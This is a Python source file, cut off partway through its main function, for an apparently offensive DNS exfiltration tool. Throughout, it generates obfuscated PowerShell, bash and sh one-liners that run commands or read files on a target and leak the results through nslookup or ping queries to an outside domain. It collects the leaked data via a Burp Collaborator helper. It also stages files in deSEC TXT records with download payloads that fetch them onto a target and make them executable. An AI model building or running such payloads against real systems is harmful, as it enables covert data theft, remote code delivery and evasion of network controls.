#!/usr/bin/env python3
"""
Modes:
  Receive file/command output via collaborator:    python main.py --from-burp
  Stage file via deSEC DNS:    python main.py --desec-stage file.txt --desec-domain x.dedyn.io --desec-token TOKEN
  Clean deSEC staged records:  python main.py --desec-clean --desec-domain x.dedyn.io --desec-token TOKEN
"""

import sys
import os
import json
import ssl
import time
import threading
import argparse
import base64
import hashlib
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError


BURP_API = "http://127.0.0.1:18542"
POLL_INTERVAL = 1
FILE_MAGIC = "FILE"
SERVE_CHUNK_SIZE = 450  # hex chars per TXT response — fits in EDNS0 UDP (4096B)
PARALLEL_BATCH = 10  # concurrent DNS queries per batch in download payloads


# ── Command generation ────────────────────────────────────────────

def generate_powershell_payload(command, domain):
    """Generate a base64-encoded PowerShell one-liner for DNS exfiltration."""
    ps_cmd = (
        f'$s=63;'
        f'$d=".{domain}";'
        f'$b=[BitConverter]::ToString('
        f'[Text.Encoding]::ASCII.GetBytes(({command})))'
        f'.Replace("-","");'
        f'$c=[math]::floor($b.length/$s);'
        f'0..$c|%{{$e=$_*$s;'
        f'$r=$(try{{$b.substring($e,$s)}}catch{{$b.substring($e)}});'
        f'if($r.length -gt 0){{'
        f'$p=$_.ToString().PadLeft(4,"0");'
        f'nslookup $p"."$r$d}}}}'
    )
    # PowerShell -enc expects UTF-16LE base64
    encoded = base64.b64encode(ps_cmd.encode("utf-16-le")).decode("ascii")
    return f"powershell -enc {encoded}"


def generate_bash_nslookup_payload(command, domain):
    """Generate a base64-encoded bash one-liner using nslookup."""
    bash_cmd = (
        f'i=0;d="{domain}";'
        f'{command}|od -A n -t x1|sed \'s/ //g\'|'
        f'while read j; do '
        f'if [ ! -z "$j" ]; then '
        f'nslookup "$(printf \'%04d\' $i).$j.$d";'
        f'((i++));'
        f'fi; done'
    )
    encoded = base64.b64encode(bash_cmd.encode("utf-8")).decode("ascii")
    return f"echo {encoded}|base64 -d|bash"


def generate_bash_ping_payload(command, domain):
    """Generate a base64-encoded bash one-liner using ping."""
    bash_cmd = (
        f'i=0;d="{domain}";'
        f'{command}|od -A n -t x1|sed \'s/ //g\'|'
        f'while read j; do '
        f'if [ ! -z "$j" ]; then '
        f'ping -c1 $(printf \'%04d\' $i).$j.$d;'
        f'((i++));'
        f'fi; done'
    )
    encoded = base64.b64encode(bash_cmd.encode("utf-8")).decode("ascii")
    return f"echo {encoded}|base64 -d|bash"


def generate_sh_nslookup_payload(command, domain):
    """Generate a base64-encoded sh one-liner using nslookup."""
    sh_cmd = (
        f'i=0;d="{domain}";'
        f'{command}|od -A n -t x1|sed \'s/ //g\'|'
        f'while read j; do '
        f'if [ ! -z "$j" ]; then '
        f'nslookup "$(printf \'%04d\' $i).$j.$d";'
        f'i=$((i+1));'
        f'fi; done'
    )
    encoded = base64.b64encode(sh_cmd.encode("utf-8")).decode("ascii")
    return f"echo {encoded}|base64 -d|sh"


def generate_sh_ping_payload(command, domain):
    """Generate a base64-encoded sh one-liner using ping."""
    sh_cmd = (
        f'i=0;d="{domain}";'
        f'{command}|od -A n -t x1|sed \'s/ //g\'|'
        f'while read j; do '
        f'if [ ! -z "$j" ]; then '
        f'ping -c1 $(printf \'%04d\' $i).$j.$d;'
        f'i=$((i+1));'
        f'fi; done'
    )
    encoded = base64.b64encode(sh_cmd.encode("utf-8")).decode("ascii")
    return f"echo {encoded}|base64 -d|sh"


# ── File retrieval (retrieve from target) payload generation ──────────────────────────

def generate_powershell_file_payload(filepath, domain):
    """Generate a base64-encoded PowerShell one-liner for file exfiltration (binary-safe)."""
    ps_cmd = (
        f'$f="{filepath}";'
        f'$n=[IO.Path]::GetFileName($f);'
        f'$b=[IO.File]::ReadAllBytes($f);'
        f'$hdr=[Text.Encoding]::ASCII.GetBytes("FILE:${{n}}:$($b.Length):");'
        f'$all=$hdr+$b;'
        f'$hex=-join($all|%{{\'{{0:x2}}\'-f $_}});'
        f'$s=63;$d=".{domain}";'
        f'$c=[math]::floor($hex.length/$s);'
        f'0..$c|%{{$e=$_*$s;'
        f'$r=$(try{{$hex.substring($e,$s)}}catch{{$hex.substring($e)}});'
        f'if($r.length -gt 0){{'
        f'$p=$_.ToString().PadLeft(4,"0");'
        f'nslookup $p"."$r$d}}}}'
    )
    encoded = base64.b64encode(ps_cmd.encode("utf-16-le")).decode("ascii")
    return f"powershell -enc {encoded}"


def generate_bash_nslookup_file_payload(filepath, domain):
    """Generate a base64-encoded bash one-liner for file exfiltration using nslookup."""
    bash_cmd = (
        f'f="{filepath}";n=$(basename "$f");s=$(wc -c < "$f"|tr -d " ");'
        f'd="{domain}";i=0;'
        f'(printf "FILE:%s:%s:" "$n" "$s";cat "$f")|od -A n -t x1|sed \'s/ //g\'|'
        f'while read j; do '
        f'if [ ! -z "$j" ]; then '
        f'nslookup "$(printf \'%04d\' $i).$j.$d";'
        f'((i++));'
        f'fi; done'
    )
    encoded = base64.b64encode(bash_cmd.encode("utf-8")).decode("ascii")
    return f"echo {encoded}|base64 -d|bash"


def generate_bash_ping_file_payload(filepath, domain):
    """Generate a base64-encoded bash one-liner for file exfiltration using ping."""
    bash_cmd = (
        f'f="{filepath}";n=$(basename "$f");s=$(wc -c < "$f"|tr -d " ");'
        f'd="{domain}";i=0;'
        f'(printf "FILE:%s:%s:" "$n" "$s";cat "$f")|od -A n -t x1|sed \'s/ //g\'|'
        f'while read j; do '
        f'if [ ! -z "$j" ]; then '
        f'ping -c1 $(printf \'%04d\' $i).$j.$d;'
        f'((i++));'
        f'fi; done'
    )
    encoded = base64.b64encode(bash_cmd.encode("utf-8")).decode("ascii")
    return f"echo {encoded}|base64 -d|bash"


def generate_sh_nslookup_file_payload(filepath, domain):
    """Generate a base64-encoded sh one-liner for file exfiltration using nslookup."""
    sh_cmd = (
        f'f="{filepath}";n=$(basename "$f");s=$(wc -c < "$f"|tr -d " ");'
        f'd="{domain}";i=0;'
        f'(printf "FILE:%s:%s:" "$n" "$s";cat "$f")|od -A n -t x1|sed \'s/ //g\'|'
        f'while read j; do '
        f'if [ ! -z "$j" ]; then '
        f'nslookup "$(printf \'%04d\' $i).$j.$d";'
        f'i=$((i+1));'
        f'fi; done'
    )
    encoded = base64.b64encode(sh_cmd.encode("utf-8")).decode("ascii")
    return f"echo {encoded}|base64 -d|sh"


def generate_sh_ping_file_payload(filepath, domain):
    """Generate a base64-encoded sh one-liner for file exfiltration using ping."""
    sh_cmd = (
        f'f="{filepath}";n=$(basename "$f");s=$(wc -c < "$f"|tr -d " ");'
        f'd="{domain}";i=0;'
        f'(printf "FILE:%s:%s:" "$n" "$s";cat "$f")|od -A n -t x1|sed \'s/ //g\'|'
        f'while read j; do '
        f'if [ ! -z "$j" ]; then '
        f'ping -c1 $(printf \'%04d\' $i).$j.$d;'
        f'i=$((i+1));'
        f'fi; done'
    )
    encoded = base64.b64encode(sh_cmd.encode("utf-8")).decode("ascii")
    return f"echo {encoded}|base64 -d|sh"


# ── Download (send to target) (deSEC staged file) payload generation ──────────────

def _bash_dig_download(domain, dest, extra_flags=""):
    """Core bash+dig parallel download payload builder."""
    fl = f"+short {extra_flags}".strip()
    B = PARALLEL_BATCH
    c = (
        f'd={domain};o={dest};'
        f'q(){{ dig {fl} TXT "$1.$d"|tr -d \'" \\n\';}};'
        f'm=$(q meta);n=${{m%%,*}};n=${{n#N:}};'
        f'h=${{m##*M:}};g=${{m%,M:*}};g=${{g##*GZ:}};'
        f'echo "[*] $n chunks gz=$g md5=$h">&2;'
        f'D=$(mktemp -d);i=0;'
        f'while [ $i -lt $n ];do '
        f'b=0;while [ $b -lt {B} ]&&[ $((i+b)) -lt $n ];do '
        f's=$(printf %04d $((i+b)));q $s>$D/$s & '
        f'b=$((b+1));done;wait;i=$((i+{B}));done;'
        f'j=0;e=0;while [ $j -lt $n ];do s=$(printf %04d $j);'
        f'[ -s $D/$s ]||{{ q $s>$D/$s;e=$((e+1));}};'
        f'j=$((j+1));done;[ $e -gt 0 ]&&echo "[*] retried $e">&2;'
        f'f=$D/0000;c=$(cat $f);printf %s "${{c#GZ:}}">$f;'
        f't=$(mktemp);j=0;while [ $j -lt $n ];do '
        f'cat $D/$(printf %04d $j)>>$t;j=$((j+1));done;'
        f'xxd -r -p $t|{{ [ $g = 1 ]&&gunzip||cat;}}>$o;rm -rf $D $t;chmod +x $o;'
        f'k=$(md5sum $o|cut -d\\  -f1);'
        f'if [ "$k" = "$h" ];then echo "[+] OK $o md5=$k">&2;'
        f'else echo "[!] MISMATCH expect=$h got=$k">&2;fi'
    )
    encoded = base64.b64encode(c.encode("utf-8")).decode("ascii")
    return f"echo {encoded}|base64 -d|bash"


def generate_bash_dig_download_payload(domain, dest):
    """bash + dig parallel download payload."""
    return _bash_dig_download(domain, dest)


def generate_bash_dig_cd_download_payload(domain, dest):
    """bash + dig parallel download payload with DNSSEC checking disabled (+cd)."""
    return _bash_dig_download(domain, dest, extra_flags="+cd")


def generate_bash_nslookup_download_payload(domain, dest):
    """bash + nslookup parallel download payload."""
    B = PARALLEL_BATCH
    c = (
        f'd={domain};o={dest};'
        f'q(){{ nslookup -type=txt "$1.$d" 2>/dev/null|'
        f'awk -F\'"\' \'/text/{{for(i=2;i<=NF;i+=2)printf $i;print ""}}\'; }};'
        f'm=$(q meta);n=${{m%%,*}};n=${{n#N:}};'
        f'h=${{m##*M:}};g=${{m%,M:*}};g=${{g##*GZ:}};'
        f'echo "[*] $n chunks gz=$g md5=$h">&2;'
        f'D=$(mktemp -d);i=0;'
        f'while [ $i -lt $n ];do '
        f'b=0;while [ $b -lt {B} ]&&[ $((i+b)) -lt $n ];do '
        f's=$(printf %04d $((i+b)));q $s>$D/$s & '
        f'b=$((b+1));done;wait;i=$((i+{B}));done;'
        f'j=0;e=0;while [ $j -lt $n ];do s=$(printf %04d $j);'
        f'[ -s $D/$s ]||{{ q $s>$D/$s;e=$((e+1));}};'
        f'j=$((j+1));done;[ $e -gt 0 ]&&echo "[*] retried $e">&2;'
        f'f=$D/0000;c=$(cat $f);printf %s "${{c#GZ:}}">$f;'
        f't=$(mktemp);j=0;while [ $j -lt $n ];do '
        f'cat $D/$(printf %04d $j)>>$t;j=$((j+1));done;'
        f'xxd -r -p $t|{{ [ $g = 1 ]&&gunzip||cat;}}>$o;rm -rf $D $t;chmod +x $o;'
        f'k=$(md5sum $o|cut -d\\  -f1);'
        f'if [ "$k" = "$h" ];then echo "[+] OK $o md5=$k">&2;'
        f'else echo "[!] MISMATCH expect=$h got=$k">&2;fi'
    )
    encoded = base64.b64encode(c.encode("utf-8")).decode("ascii")
    return f"echo {encoded}|base64 -d|bash"


def _sh_dig_download(domain, dest, extra_flags=""):
    """Core sh+dig parallel download payload builder."""
    fl = f"+short {extra_flags}".strip()
    B = PARALLEL_BATCH
    c = (
        f'd={domain};o={dest};'
        f'q(){{ dig {fl} TXT "$1.$d"|tr -d \'" \\n\';}};'
        f'm=$(q meta);n=${{m%%,*}};n=${{n#N:}};'
        f'h=${{m##*M:}};g=${{m%,M:*}};g=${{g##*GZ:}};'
        f'echo "[*] $n chunks gz=$g md5=$h">&2;'
        f'D=$(mktemp -d);i=0;'
        f'while [ $i -lt $n ];do '
        f'b=0;while [ $b -lt {B} ]&&[ $((i+b)) -lt $n ];do '
        f's=$(printf %04d $((i+b)));q $s>$D/$s & '
        f'b=$((b+1));done;wait;i=$((i+{B}));done;'
        f'j=0;e=0;while [ $j -lt $n ];do s=$(printf %04d $j);'
        f'[ -s $D/$s ]||{{ q $s>$D/$s;e=$((e+1));}};'
        f'j=$((j+1));done;[ $e -gt 0 ]&&echo "[*] retried $e">&2;'
        f'f=$D/0000;c=$(cat $f);printf %s "${{c#GZ:}}">$f;'
        f't=$(mktemp);j=0;while [ $j -lt $n ];do '
        f'cat $D/$(printf %04d $j)>>$t;j=$((j+1));done;'
        f'xxd -r -p $t|{{ [ $g = 1 ]&&gunzip||cat;}}>$o;rm -rf $D $t;chmod +x $o;'
        f'k=$(md5sum $o|cut -d\\  -f1);'
        f'if [ "$k" = "$h" ];then echo "[+] OK $o md5=$k">&2;'
        f'else echo "[!] MISMATCH expect=$h got=$k">&2;fi'
    )
    encoded = base64.b64encode(c.encode("utf-8")).decode("ascii")
    return f"echo {encoded}|base64 -d|sh"


def generate_sh_dig_download_payload(domain, dest):
    """sh + dig parallel download payload."""
    return _sh_dig_download(domain, dest)


def generate_sh_dig_cd_download_payload(domain, dest):
    """sh + dig parallel download payload with DNSSEC checking disabled (+cd)."""
    return _sh_dig_download(domain, dest, extra_flags="+cd")


def generate_powershell_download_payload(domain, dest):
    """PowerShell parallel download payload using runspace pool."""
    B = PARALLEL_BATCH
    ps = (
        f'$d="{domain}";$o="{dest}";'
        f'$m=(Resolve-DnsName -Type TXT "meta.$d").Strings-join\'\';'
        f'$m-match\'N:(\\d+)\'|Out-Null;$n=[int]$Matches[1];'
        f'$gz=$m-match\'GZ:1\';$m-match\'M:(\\w+)\'|Out-Null;$xh=$Matches[1];'
        f'Write-Host "[*] $n chunks gz=$gz md5=$xh";'
        f'$pool=[runspacefactory]::CreateRunspacePool(1,{B});$pool.Open();'
        f'$T=New-Object Collections.ArrayList;'
        f'for($i=0;$i-lt$n;$i++){{'
        f'$r=[powershell]::Create().AddScript({{param($x)(Resolve-DnsName -Type TXT $x -EA SilentlyContinue).Strings-join\'\'}}).AddArgument("$($i.ToString(\'0000\')).$d");'
        f'$r.RunspacePool=$pool;[void]$T.Add(@{{P=$r;H=$r.BeginInvoke();I=$i}})}};'
        f'$h="";$T|Sort-Object{{$_.I}}|%{{'
        f'$v=$_.P.EndInvoke($_.H);$_.P.Dispose();'
        f'$s=if($v){{$v[0]}}else{{""}};'
        f'if($_.I-eq0-and$s.StartsWith("GZ:")){{$s=$s.Substring(3)}};$h+=$s}};'
        f'$pool.Close();'
        f'$b=New-Object byte[]($h.Length/2);'
        f'for($j=0;$j-lt$h.Length;$j+=2){{$b[$j/2]=[Convert]::ToByte($h.Substring($j,2),16)}};'
        f'if($gz){{$ms=New-Object IO.MemoryStream(,$b);'
        f'$gs=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);'
        f'$os=New-Object IO.MemoryStream;$gs.CopyTo($os);$b=$os.ToArray()}};'
        f'[IO.File]::WriteAllBytes($o,$b);'
        f'$k=[BitConverter]::ToString([Security.Cryptography.MD5]::Create().ComputeHash($b)).Replace("-","").ToLower();'
        f'if($k-eq$xh){{Write-Host "[+] OK $o md5=$k"}}'
        f'else{{Write-Host "[!] MISMATCH expect=$xh got=$k"}}'
    )
    encoded = base64.b64encode(ps.encode("utf-16-le")).decode("ascii")
    return f"powershell -enc {encoded}"


DOWNLOAD_GENERATORS = {
    "1": ("PowerShell (parallel)", generate_powershell_download_payload),
    "2": ("bash + dig (parallel)", generate_bash_dig_download_payload),
    "3": ("bash + dig +cd (parallel, no DNSSEC)", generate_bash_dig_cd_download_payload),
    "4": ("bash + nslookup (parallel)", generate_bash_nslookup_download_payload),
    "5": ("sh + dig (parallel)", generate_sh_dig_download_payload),
    "6": ("sh + dig +cd (parallel, no DNSSEC)", generate_sh_dig_cd_download_payload),
}

def display_download_payloads(domain, dest):
    """Display all download payload variants."""
    print(f"\n{'=' * 60}")
    print(f"  DOWNLOAD PAYLOADS (native tools — no client script needed)")
    print(f"  Source: {domain}")
    print(f"  Dest:   {dest}")
    print(f"{'=' * 60}\n")

    for key in sorted(DOWNLOAD_GENERATORS.keys()):
        name, gen_func = DOWNLOAD_GENERATORS[key]
        payload = gen_func(domain, dest)
        print(f"  [{key}] {name}:")
        print(f"  {payload}")
        print()

    print(f"{'=' * 60}")


# ── Payload tables ────────────────────────────────────────────────

CMD_GENERATORS = {
    "1": ("PowerShell (nslookup)", generate_powershell_payload),
    "2": ("bash + nslookup", generate_bash_nslookup_payload),
    "3": ("bash + ping (slow)", generate_bash_ping_payload),
    "4": ("sh + nslookup", generate_sh_nslookup_payload),
    "5": ("sh + ping (slow)", generate_sh_ping_payload),
}

FILE_GENERATORS = {
    "1": ("PowerShell (nslookup)", generate_powershell_file_payload),
    "2": ("bash + nslookup", generate_bash_nslookup_file_payload),
    "3": ("bash + ping (slow)", generate_bash_ping_file_payload),
    "4": ("sh + nslookup", generate_sh_nslookup_file_payload),
    "5": ("sh + ping (slow)", generate_sh_ping_file_payload),
}

PLATFORM_MENU = [
    ("1", "PowerShell (nslookup)"),
    ("2", "bash + nslookup"),
    ("3", "bash + ping (slow)"),
    ("4", "sh + nslookup"),
    ("5", "sh + ping (slow)"),
]


def _display_all(generators, target, label, domain):
    """Display all payload variants for a given target (command or file path)."""
    print(f"\n{'=' * 60}")
    print(f"  TARGET PAYLOADS")
    print(f"  {label}: {target}")
    print(f"  Domain:  {domain}")
    print(f"{'=' * 60}\n")

    for key in sorted(generators.keys()):
        name, gen_func = generators[key]
        payload = gen_func(target, domain)
        print(f"  [{key}] {name}:")
        print(f"  {payload}")
        print()

    print(f"{'=' * 60}")


def _display_single(generators, target, choice, domain):
    """Display a single payload variant."""
    name, gen_func = generators[choice]
    payload = gen_func(target, domain)
    print(f"\n{'=' * 60}")
    print(f"  {name} payload:")
    print(f"{'=' * 60}")
    print(f"\n  {payload}\n")
    print(f"{'=' * 60}")


def _prompt_platform(generators, target, label, domain):
    """Prompt user for platform choice and display the payload."""
    print()
    for key, name in PLATFORM_MENU:
        print(f"  [{key}] {name}")
    print("  [a] Show all payloads")
    print()
    choice = input("[?] Select platform: ").strip()

    if choice == "a":
        _display_all(generators, target, label, domain)
    elif choice in generators:
        _display_single(generators, target, choice, domain)
    else:
        print(f"[!] Invalid choice: {choice}")
        return False
    return True


def interactive_payload(domain):
    """Interactively prompt for mode, target, and platform."""
    print()
    print("  [1] Execute command")
    print("  [2] Exfiltrate file")
    print()
    mode = input("[?] Mode: ").strip()

    if mode == "1":
        command = input("[?] Command to execute on target: ").strip()
        if not command:
            print("[!] No command entered.")
            return
        _prompt_platform(CMD_GENERATORS, command, "Command", domain)
    elif mode == "2":
        filepath = input("[?] File path on target: ").strip()
        if not filepath:
            print("[!] No file path entered.")
            return
        _prompt_platform(FILE_GENERATORS, filepath, "File", domain)
    else:
        print(f"[!] Invalid mode: {mode}")


# ── Burp Helper polling ───────────────────────────────────────────

def poll_burp_helper():
    url = f"{BURP_API}/poll"
    try:
        resp = urlopen(Request(url), timeout=10)
        body = resp.read().decode("utf-8")
        data = json.loads(body)
        return data.get("responses", [])
    except Exception:
        return []


def extract_chunk_from_burp(interaction):
    """Extract (seq, hex_data) from a Burp interaction."""
    itype = interaction.get("type", "")
    if itype and itype.upper() != "DNS":
        return None

    # Parse the raw DNS query — always present for DNS interactions
    raw_query = interaction.get("raw_query", "")
    if raw_query:
        return _parse_raw_dns(raw_query)

    return None



def _parse_raw_dns(raw_b64):
    try:
        raw = base64.b64decode(raw_b64)
    except Exception:
        return None
    if len(raw) < 14:
        return None
    labels = []
    idx = 12
    while idx < len(raw):
        length = raw[idx]
        idx += 1
        if length == 0:
            break
        if idx + length > len(raw):
            break
        labels.append(raw[idx:idx + length].decode("ascii", errors="replace"))
        idx += length
    if len(labels) >= 2 and labels[0].isdigit():
        cleaned = "".join(c for c in labels[1] if c in "0123456789abcdefABCDEF")
        if cleaned:
            return (int(labels[0]), cleaned)
    return None


# ── Collaborator polling loop (for --from-burp receive) ───────────

def burp_receive_loop(chunks, lock):
    """Poll Burp helper until user presses Enter."""
    stop_flag = threading.Event()

    def _wait_for_enter():
        input()
        stop_flag.set()

    input_thread = threading.Thread(target=_wait_for_enter, daemon=True)
    input_thread.start()

    print("[*] Press ENTER to stop receiving and write output.\n")

    while not stop_flag.is_set():
        interactions = poll_burp_helper()
        for interaction in interactions:
            result = extract_chunk_from_burp(interaction)
            if result:
                seq, hex_data = result
                with lock:
                    if seq not in chunks:
                        chunks[seq] = hex_data
                        print(f"  [RECV {seq:04d}] {hex_data}")

        stop_flag.wait(POLL_INTERVAL)


# ── Reassembly ────────────────────────────────────────────────────

def reassemble_and_output(chunks, output_path):
    """Reassemble hex chunks into bytes and handle output."""
    if not chunks:
        print("[!] No data received.")
        return

    sorted_chunks = sorted(chunks.items(), key=lambda x: x[0])
    full_hex = "".join(h for _, h in sorted_chunks)

    # Gap check
    expected = set(range(sorted_chunks[0][0], sorted_chunks[-1][0] + 1))
    missing = expected - set(chunks.keys())
    if missing:
        print(f"[!] WARNING: Missing chunks: {sorted(missing)}")

    try:
        raw = bytes.fromhex(full_hex)
    except ValueError as e:
        print(f"[!] Hex decode error: {e}")
        return

    # Detect file transfer header
    file_info = _detect_file_header(raw)

    if file_info:
        filename, expected_size, header_len = file_info
        file_data = raw[header_len:]

        print(f"[*] File transfer: {filename}")
        print(f"[*] Expected: {expected_size} bytes, received: {len(file_data)} bytes")

        if len(file_data) != expected_size:
            print(f"[!] Size mismatch!")

        dest = _save_file(file_data, filename, output_path)
        print(f"\n{'=' * 60}")
        print(f"  FILE SAVED: {dest} ({len(file_data)} bytes)")
        print(f"{'=' * 60}")
    else:
        decoded = raw.decode("utf-8", errors="replace")
        print(f"\n{'=' * 60}")
        print("  RECONSTRUCTED OUTPUT")
        print("=" * 60)
        print(decoded)
        print("=" * 60)
        if output_path:
            dest = _save_file(raw, "output.txt", output_path)
            print(f"  Also saved to: {dest}")


def _detect_file_header(raw):
    try:
        preview = raw[:300].decode("utf-8", errors="replace")
    except Exception:
        return None

    if not preview.startswith(FILE_MAGIC + ":"):
        return None

    # FILE:<filename>:<size>:
    first = preview.find(":")
    second = preview.find(":", first + 1)
    third = preview.find(":", second + 1)

    if second < 0 or third < 0:
        return None

    filename = preview[first + 1:second]
    size_str = preview[second + 1:third]

    if not size_str.isdigit():
        return None

    expected_size = int(size_str)
    header_len = len(f"{FILE_MAGIC}:{filename}:{size_str}:".encode("utf-8"))

    return filename, expected_size, header_len


def _save_file(data, filename, output_path):
    if output_path:
        if os.path.isdir(output_path):
            dest = os.path.join(output_path, filename)
        else:
            dest = output_path
    else:
        dest = filename

    if os.path.exists(dest):
        base, ext = os.path.splitext(dest)
        n = 1
        while os.path.exists(f"{base}_{n}{ext}"):
            n += 1
        dest = f"{base}_{n}{ext}"

    os.makedirs(os.path.dirname(dest) or ".", exist_ok=True)
    with open(dest, "wb") as f:
        f.write(data)
    return dest


# ── deSEC DNS staging ───────────────

DESEC_API = "https://desec.io/api/v1"


def _desec_request(method, path, token, body=None):
    """Make an authenticated request to the deSEC API."""
    url = f"{DESEC_API}{path}"
    data = json.dumps(body).encode("utf-8") if body is not None else None
    req = Request(url, data=data, method=method)
    req.add_header("Authorization", f"Token {token}")
    req.add_header("Content-Type", "application/json")
    ctx = ssl.create_default_context()
    try:
        resp = urlopen(req, context=ctx, timeout=30)
        raw = resp.read().decode("utf-8")
        return resp.status, json.loads(raw) if raw.strip() else None
    except HTTPError as e:
        raw = e.read().decode("utf-8", errors="replace")
        print(f"[!] deSEC API error {e.code}: {raw}")
        return e.code, None


def desec_stage(file_path, domain, token, dest=None):
    """Stage a file as TXT records on deSEC DNS.

    Compresses the file with gzip before staging.
    Creates records like:
        0000.domain  TXT  "GZ:hexchunk..."
        0001.domain  TXT  "hexchunk..."
        ...
        NNNN.domain  TXT  "EOF"
    """
    import gzip as _gzip
    import re as _re

    # Check for existing staged records and offer to clean
    print(f"[*] Checking for existing staged records on {domain}...")
    existing = _desec_get_all(
        f"/domains/{domain}/rrsets/?type=TXT&cursor=",
        token,
    )
    if existing is not None:
        stale = [r for r in existing if _re.fullmatch(r"[a-z]{0,4}(\d{4,}|meta)", r.get("subname", ""))]
        if stale:
            ans = input(f"[?] Found {len(stale)} existing staged records. Clean before staging? [Y/n] ").strip().lower()
            if ans in ("", "y", "yes"):
                desec_clean(domain, token)
            else:
                print("[*] Keeping existing records")

    try:
        with open(file_path, "rb") as f:
            raw_data = f.read()
    except Exception as e:
        print(f"[!] Cannot read {file_path}: {e}")
        sys.exit(1)

    file_md5 = hashlib.md5(raw_data).hexdigest()
    compressed = _gzip.compress(raw_data, compresslevel=9)
    ratio = len(compressed) / len(raw_data) * 100
    print(f"[*] File:        {file_path}")
    print(f"[*] Original:    {len(raw_data)} bytes")
    print(f"[*] MD5:         {file_md5}")
    print(f"[*] Compressed:  {len(compressed)} bytes ({ratio:.0f}%)")

    hex_str = compressed.hex()
    # Prefix first chunk with "GZ:" marker so client knows to decompress
    chunks = []
    # First chunk: "GZ:" + hex data (leave room for the 3-char prefix)
    first_size = (SERVE_CHUNK_SIZE - 3) & ~1  # room for "GZ:" prefix, must be even for hex pairs
    chunks.append("GZ:" + hex_str[:first_size])
    for i in range(first_size, len(hex_str), SERVE_CHUNK_SIZE):
        chunks.append(hex_str[i:i + SERVE_CHUNK_SIZE])

    print(f"[*] Chunks:      {len(chunks)} TXT records")

    # Self-verify: simulate client reassembly to catch chunking bugs
    _verify_chunks = []
    for ci, c in enumerate(chunks):
        t = c
        if ci == 0 and t.startswith("GZ:"):
            t = t[3:]
        _verify_chunks.append(t)
    _verify_hex = "".join(_verify_chunks)
    try:
        _verify_bytes = bytes.fromhex(_verify_hex)
        _gzip.decompress(_verify_bytes)
        print(f"[*] Verify:      OK (reassembly + decompress passed)")
    except Exception as e:
        print(f"[!] Verify FAILED: {e}")
        print(f"[!] This means the chunking logic has a bug — aborting")
        sys.exit(1)

    # Build rrset list — each chunk is a separate subdomain
    rrsets = []
    for i, chunk in enumerate(chunks):
        rrsets.append({
            "subname": f"{i:04d}",
            "type": "TXT",
            "ttl": 3600,
            "records": [f'"{chunk}"'],
        })
    # Add EOF marker
    rrsets.append({
        "subname": f"{len(chunks):04d}",
        "type": "TXT",
        "ttl": 3600,
        "records": ['"EOF"'],
    })
    # Add metadata record for parallel downloaders
    rrsets.append({
        "subname": "meta",
        "type": "TXT",
        "ttl": 3600,
        "records": [f'"N:{len(chunks)},GZ:1,M:{file_md5}"'],
    })

    # deSEC bulk PATCH — split into batches of 500 rrsets
    batch_size = 500
    batches = [rrsets[i:i + batch_size] for i in range(0, len(rrsets), batch_size)]
    print(f"[*] Uploading {len(rrsets)} TXT records to {domain} ({len(batches)} batch{'es' if len(batches) != 1 else ''})...")

    from concurrent.futures import ThreadPoolExecutor, as_completed

    def _upload_batch(batch_idx, batch_data):
        """Upload a single batch, retry on 429 rate limit."""
        for attempt in range(3):
            status, _ = _desec_request(
                "PATCH",
                f"/domains/{domain}/rrsets/",
                token,
                batch_data,
            )
            if status == 429:
                wait = 2 ** attempt
                print(f"  [*] Batch {batch_idx + 1}: rate limited, retrying in {wait}s...")
                time.sleep(wait)
                continue
            return batch_idx, status
        return batch_idx, status

    failed = False
    with ThreadPoolExecutor(max_workers=min(len(batches), 4)) as pool:
        futures = [pool.submit(_upload_batch, i, b) for i, b in enumerate(batches)]
        for f in as_completed(futures):
            idx, status = f.result()
            if status not in (200, 201):
                print(f"[!] Batch {idx + 1} failed (status {status})")
                failed = True
            else:
                print(f"  [*] Batch {idx + 1}/{len(batches)} uploaded")

    if failed:
        print("[!] Some batches failed — records may be incomplete")
        sys.exit(1)

    print(f"[+] Staged {len(chunks)} chunks + EOF on {domain}")

    if not dest:
        dest = f"/tmp/{os.path.basename(file_path)}"
    display_download_payloads(domain, dest)


def _desec_get_all(path, token):
    """Paginated GET — fetches all pages and returns combined list."""
    import re
    all_items = []
    url = f"{DESEC_API}{path}"
    ctx = ssl.create_default_context()

    while url:
        req = Request(url, method="GET")
        req.add_header("Authorization", f"Token {token}")
        req.add_header("Content-Type", "application/json")
        try:
            resp = urlopen(req, context=ctx, timeout=30)
            raw = resp.read().decode("utf-8")
            items = json.loads(raw) if raw.strip() else []
            all_items.extend(items)

            # Parse Link header for next page
            link = resp.headers.get("Link", "")
            m = re.search(r'<([^>]+)>;\s*rel="next"', link)
            url = m.group(1) if m else None
        except HTTPError as e:
            raw = e.read().decode("utf-8", errors="replace")
            print(f"[!] deSEC API error {e.code}: {raw}")
            return None

    return all_items


def desec_clean(domain, token):
    """Remove all numbered TXT records (0000-9999) from a deSEC domain."""
    print(f"[*] Fetching existing records for {domain}...")

    rrsets = _desec_get_all(
        f"/domains/{domain}/rrsets/?type=TXT&cursor=",
        token,
    )
    if rrsets is None:
        print("[!] Could not fetch records")
        return

    # Find staged chunk subnames (digits or alpha prefix + digits)
    import re as _re
    to_delete = [r for r in rrsets if _re.fullmatch(r"[a-z]{0,4}(\d{4,}|meta)", r.get("subname", ""))]
    if not to_delete:
        print("[*] No staged records found")
        return

    # To delete via bulk PATCH, set records to empty list
    delete_rrsets = [{
        "subname": r["subname"],
        "type": "TXT",
        "ttl": 3600,
        "records": [],
    } for r in to_delete]

    batch_size = 500
    batches = [delete_rrsets[i:i + batch_size] for i in range(0, len(delete_rrsets), batch_size)]
    print(f"[*] Removing {len(to_delete)} staged TXT records ({len(batches)} batch{'es' if len(batches) != 1 else ''})...")

    from concurrent.futures import ThreadPoolExecutor, as_completed

    def _delete_batch(batch_idx, batch_data):
        for attempt in range(3):
            status, _ = _desec_request(
                "PATCH",
                f"/domains/{domain}/rrsets/",
                token,
                batch_data,
            )
            if status == 429:
                time.sleep(2 ** attempt)
                continue
            return batch_idx, status
        return batch_idx, status

    with ThreadPoolExecutor(max_workers=min(len(batches), 4)) as pool:
        futures = [pool.submit(_delete_batch, i, b) for i, b in enumerate(batches)]
        for f in as_completed(futures):
            idx, status = f.result()
            if status not in (200, 201, 204):
                print(f"[!] Delete failed for batch {idx + 1}")
            else:
                print(f"  [*] Deleted batch {idx + 1}/{len(batches)}")

    print(f"[+] Cleaned {len(to_delete)} records from {domain}")


# ── Main ──────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
